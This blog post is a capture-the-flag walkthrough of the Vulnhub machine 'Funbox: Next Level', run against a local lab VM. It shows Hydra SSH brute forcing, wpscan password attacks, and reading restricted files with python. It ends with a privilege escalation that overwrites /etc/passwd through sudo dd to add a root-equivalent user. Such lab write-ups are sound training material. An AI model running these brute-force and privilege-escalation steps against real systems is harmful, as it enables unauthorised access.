---
layout: post
title:  "Vulnhub - Funbox: Next Level"
date:   2020-10-01 20:00:00 +1000
category: hacking
---

## Introduction
*Lets separate the script-kids from script-teenies.  
Hint: The first impression is not always the right one!*

No updates for a few days; I was away for work for a bit and I've been partway through a few things - but now I've completed [Funbox: Next Level](https://www.vulnhub.com/entry/funbox-next-level,547/). Here's how.

## Ports
Not much to say here, we've just got SSH on 22 and HTTP on Port 80. Nmap says Port 80 is Apache; presumably that's where we are looking.

## Drupal; but not really
So gobuster quickly tells us that we've got a *drupal* directory, so that seems like a good place to look. Except when we try to look inside of that 
directory:

``
root@kali:/opt/vulnhub/nextlevel# gobuster dir -u http://192.168.1.92/drupal -w /usr/share/dirb/wordlists/common.txt
``

gobuster gets sad and says:
>(Client.Timeout exceeded while awaiting headers)

Hmm, what's going on? If we visit http://192.168.1.92/drupal in Firefox, we get a message that it is waiting for 192.168.178.33. This is not an IP on my network, so is unreachable - and no wonder gobuster times out. So what is happening? Somehow the server is trying to do a redirect to an IP address that doesn't exist - what do we do?

Fortunately, WFUZZ doesn't care about that:

``
root@kali:/opt/vulnhub/nextlevel# wfuzz -c --hh 274  -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt http://192.168.1.92/drupal/FUZZ.php
``

This brings up a couple of interesting things, including *wp-login*. So are we actually running wordpress? Spoiler alert: yes.

## Wordpress
Normally I'd run wpscan on a wordpress site and frankly this was no exception. But how do we deal with the redirect? There is a switch we can use to ignore it:

``
--ignore-main-redirect
``

Running *wpscan -e* turns up two users; **ben** and **admin**. Also xmlrpc is enabled, so we can try a password attack:

``
root@kali:/opt/vulnhub/nextlevel# wpscan --url http://192.168.1.92/drupal --ignore-main-redirect --force -U 'ben,admin' -P /usr/share/seclists/Passwords/probable-v2-top12000.txt
``

However, it doesn't work. Now what?

## et tu, Bruteforce?
Well, we know one of our usernames, so let's see what Hydra thinks:

{% highlight shell %}
root@kali:/opt/vulnhub/nextlevel# hydra -l ben -P /usr/share/wordlists/rockyou.txt 192.168.1.92 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-30 12:04:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking ssh://192.168.1.92:22/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344224 to do in 1350:41h, 16 active
[22][ssh] host: 192.168.1.92   login: ben   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-30 12:06:58
{% endhighlight %}

Boom, we're in. We can *ssh* in as *ben*.

## On the box
On the box, life is still a little difficult. We've got no **head**, **tail** or **cat**. Maybe others too, but that's what I tried and they all didn't work. Which made *linpeas* sad too. Is there a way to get around not being able to read files? Sure:

``
ben@funbox5:/$ python3 -c 'import sys; sys.stdout.write(sys.stdin.read())' < /etc/passwd
``

So that's useful. With it, we can read Ben's mail:

{% highlight shell %}
From maria@funbox5.fritz.box  Mon Aug 31 15:04:50 2020
Return-Path: <maria@funbox5.fritz.box>
Received: from funbox4 (localhost [127.0.0.1])
	by funbox5.fritz.box (8.15.2/8.15.2/Debian-3) with SMTP id 07VD43wQ015008
	for ben@localhost; Mon, 31 Aug 2020 15:04:40 +0200
Date: Mon, 31 Aug 2020 15:04:03 +0200
From: maria@funbox5.fritz.box
Message-Id: <202008311304.07VD43wQ015008@funbox5.fritz.box>
Status: RO
X-UID: 3                                                 

Hi Ben,

please come to my office at 10:00 a.m. We have a lot to talk about!
The new employees must be created. Ive already finished Adam.
CREDS FOR ADAM WERE HERE
{% endhighlight %}

So now we can *su* as Adam.

## Adam
What can Adam do? Adam can use **dd** as root. Also **de** and **df**, whatever they are. Actually de doesn't exist, and I didn't worry about df.

{% highlight shell %}
adam@funbox5:~$ sudo -l
[sudo] password for adam: 
Matching Defaults entries for adam on funbox5:
    env_reset

User adam may run the following commands on funbox5:
    (root) PASSWD: /bin/dd
    (root) PASSWD: /bin/de
    (root) PASSWD: /bin/df
{% endhighlight %}

## Privesc
What can we do with **dd**? [GTFOBins](https://gtfobins.github.io/gtfobins/dd/#sudo) says we can read and write privileged files. So how about we try writing to */etc/passwd*? We essentially want to append a new line. I'll do that by using **dd** to do a read of */etc/passwd* into a temporary file, I'll append a new line to that, and then I'll overwrite the real */etc/passwd* with my copy. Sounds good? Let's see:

{% highlight shell %}
adam@funbox5:/tmp$ sudo -u root /bin/dd if=/etc/passwd > temp
adam@funbox5:/tmp$ python3 -c 'import sys; sys.stdout.write(sys.stdin.read())' < temp
-- SNIPPED - just made sure it worked okay --
adam@funbox5:/tmp$ openssl passwd mrcake
7.wfjKUb48CxM
adam@funbox5:/tmp$ echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> temp
adam@funbox5:/tmp$ INFILE=temp
adam@funbox5:/tmp$ OUTFILE=/etc/passwd
adam@funbox5:/tmp$ sudo -u root /bin/dd if=$INFILE of=$OUTFILE
4+1 records in
4+1 records out
2065 bytes (2.1 kB, 2.0 KiB) copied, 0.000658541 s, 3.1 MB/s
adam@funbox5:/tmp$ su root2
Password: 
root@funbox5:/tmp# cd /root
root@funbox5:~# 
root@funbox5:~# cat flag.txt
ASCII ART CLIPPED

Made with ❤ by @0815R2d2
Please, tweet me a screenshot on Twitter.
THX 4 playing this Funbox.
{% endhighlight %}

Thank you, **0815R2d2**.
